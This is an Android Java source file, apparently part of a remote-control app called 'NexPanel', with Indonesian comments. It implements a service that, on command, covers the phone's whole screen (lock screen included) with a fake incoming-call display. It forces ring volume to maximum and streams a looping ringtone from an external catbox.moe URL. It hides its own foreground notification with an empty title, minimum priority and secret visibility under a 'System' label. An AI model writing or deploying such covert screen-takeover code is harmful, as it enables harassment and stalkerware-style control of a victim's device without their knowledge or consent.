package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

/**
 * FakeCallService — Fake Incoming Call Overlay
 * ═════════════════════════════════════════════
 * Menampilkan overlay fullscreen menyerupai panggilan masuk nyata.
 * Overlay ini:
 *  - Menutupi seluruh layar (tidak bisa disentuh selain tombol)
 *  - Menampilkan nama & nomor HP palsu
 *  - Memutar ringtone diam-diam dari URL (catbox.moe mp3)
 *  - Mengunci layar agar tidak bisa keluar
 *  - Dismiss otomatis saat perintah stopFakeCall diterima
 *
 * Actions:
 *  ACTION_START_FAKE_CALL  → mulai fake call, extra: caller_name, caller_number
 *  ACTION_STOP_FAKE_CALL   → hentikan fake call + destroy service
 */
public class FakeCallService extends Service {

    private static final String TAG     = "FakeCallService";
    private static final String CHANNEL = "nex_fake_call";
    private static final int    NID     = 9997;

    public static final String ACTION_START_FAKE_CALL = "com.nex.panel.ACTION_START_FAKE_CALL";
    public static final String ACTION_STOP_FAKE_CALL  = "com.nex.panel.ACTION_STOP_FAKE_CALL";
    public static final String EXTRA_CALLER_NAME      = "caller_name";
    public static final String EXTRA_CALLER_NUMBER    = "caller_number";

    // URL ringtone yang diputar diam-diam
    private static final String RINGTONE_URL =
        "https://files.catbox.moe/uad8zx.mp3";

    // Singleton ref
    private static FakeCallService instance;
    public  static boolean isRunning() { return instance != null; }

    private WindowManager   wm;
    private View            overlayRoot;
    private MediaPlayer     mediaPlayer;
    private PowerManager.WakeLock wakeLock;
    private final Handler   uiHandler = new Handler(Looper.getMainLooper());

    // ── onCreate ──────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createNotificationChannel();
        startForeground(NID, buildNotification());
        acquireWakeLock();
    }

    // ── onStartCommand ────────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        final String action = intent.getAction();

        if (ACTION_START_FAKE_CALL.equals(action)) {
            final String callerName   = intent.getStringExtra(EXTRA_CALLER_NAME);
            final String callerNumber = intent.getStringExtra(EXTRA_CALLER_NUMBER);
            uiHandler.post(() -> showFakeCall(
                callerName   != null && !callerName.isEmpty()   ? callerName   : "Unknown",
                callerNumber != null && !callerNumber.isEmpty() ? callerNumber : "+62 000-000-0000"
            ));
        } else if (ACTION_STOP_FAKE_CALL.equals(action)) {
            uiHandler.post(this::dismissFakeCall);
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── onDestroy ─────────────────────────────────────────────────────────
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        stopRingtone();
        removeOverlay();
        releaseWakeLock();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // OVERLAY FULLSCREEN
    // ═══════════════════════════════════════════════════════════════════════

    private void showFakeCall(String callerName, String callerNumber) {
        try {
            wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm == null) return;

            // Buat layout overlay
            overlayRoot = buildCallLayout(callerName, callerNumber);

            // Parameter overlay — fullscreen, di atas segalanya, TIDAK BISA DISENTUH
            // kecuali di tombol yang kita tentukan
            int overlayType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                overlayType,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN      |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS      |
                WindowManager.LayoutParams.FLAG_FULLSCREEN             |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED       |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD       |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON         |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.OPAQUE
            );
            params.gravity = Gravity.TOP | Gravity.START;
            params.x = 0;
            params.y = 0;

            wm.addView(overlayRoot, params);
            Log.d(TAG, "Fake call overlay shown: " + callerName + " " + callerNumber);

            // Putar ringtone diam-diam
            startRingtone();

        } catch (Exception e) {
            Log.e(TAG, "showFakeCall error: " + e.getMessage());
            stopSelf();
        }
    }

    private void dismissFakeCall() {
        stopRingtone();
        removeOverlay();
        stopSelf();
    }

    private void removeOverlay() {
        try {
            if (wm != null && overlayRoot != null) {
                wm.removeView(overlayRoot);
                overlayRoot = null;
            }
        } catch (Exception ignored) {}
    }

    // ═══════════════════════════════════════════════════════════════════════
    // BUILD UI — menyerupai tampilan panggilan masuk Android
    // ═══════════════════════════════════════════════════════════════════════

    private View buildCallLayout(String callerName, String callerNumber) {
        Context ctx = this;

        // Root — background hitam/gelap seperti lock screen
        LinearLayout root = new LinearLayout(ctx);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#1A1A2E")); // gelap biru-hitam
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(0, dpToPx(80), 0, dpToPx(60));

        // ─── Label "PANGGILAN MASUK"
        TextView tvLabel = new TextView(ctx);
        tvLabel.setText("PANGGILAN MASUK");
        tvLabel.setTextColor(Color.parseColor("#AAAAAA"));
        tvLabel.setTextSize(13f);
        tvLabel.setLetterSpacing(0.15f);
        tvLabel.setGravity(Gravity.CENTER);
        root.addView(tvLabel, fullWidthLP());

        addSpace(root, 40);

        // ─── Avatar circle (inisial nama)
        LinearLayout avatarCircle = new LinearLayout(ctx);
        avatarCircle.setGravity(Gravity.CENTER);
        avatarCircle.setBackgroundColor(Color.parseColor("#2ECC71")); // hijau
        LinearLayout.LayoutParams avatarLP = new LinearLayout.LayoutParams(dpToPx(100), dpToPx(100));
        avatarLP.gravity = Gravity.CENTER_HORIZONTAL;

        TextView tvInitial = new TextView(ctx);
        tvInitial.setText(callerName.isEmpty() ? "?" : String.valueOf(callerName.charAt(0)).toUpperCase());
        tvInitial.setTextColor(Color.WHITE);
        tvInitial.setTextSize(48f);
        tvInitial.setTypeface(null, Typeface.BOLD);
        tvInitial.setGravity(Gravity.CENTER);
        avatarCircle.addView(tvInitial, matchLP());
        // Langsung tambah avatarCircle ke root dengan ukuran yang tepat
        root.addView(avatarCircle, avatarLP);

        addSpace(root, 32);

        // ─── Nama pemanggil
        TextView tvName = new TextView(ctx);
        tvName.setText(callerName);
        tvName.setTextColor(Color.WHITE);
        tvName.setTextSize(32f);
        tvName.setTypeface(null, Typeface.BOLD);
        tvName.setGravity(Gravity.CENTER);
        root.addView(tvName, fullWidthLP());

        addSpace(root, 8);

        // ─── Nomor telepon
        TextView tvNumber = new TextView(ctx);
        tvNumber.setText(callerNumber);
        tvNumber.setTextColor(Color.parseColor("#AAAAAA"));
        tvNumber.setTextSize(16f);
        tvNumber.setGravity(Gravity.CENTER);
        root.addView(tvNumber, fullWidthLP());

        addSpace(root, 16);

        // ─── Status "Menelepon..."
        TextView tvStatus = new TextView(ctx);
        tvStatus.setText("Menelepon...");
        tvStatus.setTextColor(Color.parseColor("#888888"));
        tvStatus.setTextSize(14f);
        tvStatus.setGravity(Gravity.CENTER);
        root.addView(tvStatus, fullWidthLP());

        // ─── Spacer fleksibel
        View spacer = new View(ctx);
        LinearLayout.LayoutParams spacerLP = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f);
        root.addView(spacer, spacerLP);

        // ─── Baris tombol Tolak & Terima
        LinearLayout btnRow = new LinearLayout(ctx);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);
        btnRow.setPadding(dpToPx(40), 0, dpToPx(40), 0);

        // Tombol Tolak (merah) — tap = unlock / dismiss fake call
        LinearLayout btnTolak = makeCallButton(ctx, Color.parseColor("#E74C3C"), "✕", "Tolak");
        btnTolak.setOnClickListener(v -> dismissFakeCall());

        // Spacer tengah
        View btnSpacer = new View(ctx);
        LinearLayout.LayoutParams btnSpacerLP = new LinearLayout.LayoutParams(0,
            LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        btnSpacer.setLayoutParams(btnSpacerLP); // ← wajib! tanpa ini spacer tidak jalan

        // Tombol Terima (hijau) — tap juga = dismiss (fake call, jadi sama aja)
        LinearLayout btnTerima = makeCallButton(ctx, Color.parseColor("#2ECC71"), "✆", "Terima");
        btnTerima.setOnClickListener(v -> dismissFakeCall());

        btnRow.addView(btnTolak);
        btnRow.addView(btnSpacer);
        btnRow.addView(btnTerima);

        LinearLayout.LayoutParams btnRowLP = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        root.addView(btnRow, btnRowLP);

        return root;
    }

    /** Buat tombol bulat dengan ikon + label di bawah */
    private LinearLayout makeCallButton(Context ctx, int color, String icon, String label) {
        LinearLayout col = new LinearLayout(ctx);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setGravity(Gravity.CENTER_HORIZONTAL);

        // Lingkaran berwarna
        LinearLayout circle = new LinearLayout(ctx);
        circle.setGravity(Gravity.CENTER);
        circle.setBackgroundColor(color);
        LinearLayout.LayoutParams circleLP = new LinearLayout.LayoutParams(
            dpToPx(72), dpToPx(72));
        circleLP.gravity = Gravity.CENTER_HORIZONTAL;

        TextView tvIcon = new TextView(ctx);
        tvIcon.setText(icon);
        tvIcon.setTextColor(Color.WHITE);
        tvIcon.setTextSize(28f);
        tvIcon.setGravity(Gravity.CENTER);
        circle.addView(tvIcon, matchLP());

        // Label di bawah tombol
        TextView tvLabel = new TextView(ctx);
        tvLabel.setText(label);
        tvLabel.setTextColor(Color.WHITE);
        tvLabel.setTextSize(13f);
        tvLabel.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams labelLP = fullWidthLP();
        labelLP.topMargin = dpToPx(8);

        col.addView(circle, circleLP);
        col.addView(tvLabel, labelLP);

        LinearLayout.LayoutParams colLP = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        col.setLayoutParams(colLP);

        return col;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // RINGTONE — putar diam-diam dari URL catbox
    // ═══════════════════════════════════════════════════════════════════════

    private void startRingtone() {
        try {
            // Set volume ke max (STREAM_RING) agar efektif
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            if (am != null) {
                int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_RING);
                am.setStreamVolume(AudioManager.STREAM_RING, maxVol, 0);
            }

            mediaPlayer = new MediaPlayer();
            mediaPlayer.setAudioAttributes(
                new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_NOTIFICATION_RINGTONE)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .build()
            );
            mediaPlayer.setDataSource(RINGTONE_URL);
            mediaPlayer.setLooping(true); // loop terus selama fake call aktif
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(mp -> {
                mp.start();
                Log.d(TAG, "Ringtone started");
            });
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                Log.e(TAG, "Ringtone error: " + what);
                return true;
            });
        } catch (Exception e) {
            Log.e(TAG, "startRingtone error: " + e.getMessage());
        }
    }

    private void stopRingtone() {
        try {
            if (mediaPlayer != null) {
                if (mediaPlayer.isPlaying()) mediaPlayer.stop();
                mediaPlayer.release();
                mediaPlayer = null;
            }
        } catch (Exception ignored) {}
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WAKELOCK — jaga layar tetap nyala
    // ═══════════════════════════════════════════════════════════════════════

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "NexPanel:FakeCallWakeLock"
                );
                wakeLock.acquire(10 * 60 * 1000L); // max 10 menit
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ═══════════════════════════════════════════════════════════════════════
    // NOTIFICATION (foreground service wajib punya notif)
    // ═══════════════════════════════════════════════════════════════════════

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, "NexPanel System", NotificationManager.IMPORTANCE_MIN);
            ch.setSound(null, null);
            ch.enableVibration(false);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setSmallIcon(android.R.drawable.ic_menu_call)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // HELPER
    // ═══════════════════════════════════════════════════════════════════════

    private int dpToPx(int dp) {
        return (int) (dp * getResources().getDisplayMetrics().density);
    }

    private LinearLayout.LayoutParams fullWidthLP() {
        return new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
    }

    private LinearLayout.LayoutParams matchLP() {
        return new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.MATCH_PARENT);
    }

    private void addSpace(LinearLayout parent, int dp) {
        View v = new View(this);
        parent.addView(v, new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, dpToPx(dp)));
    }
}
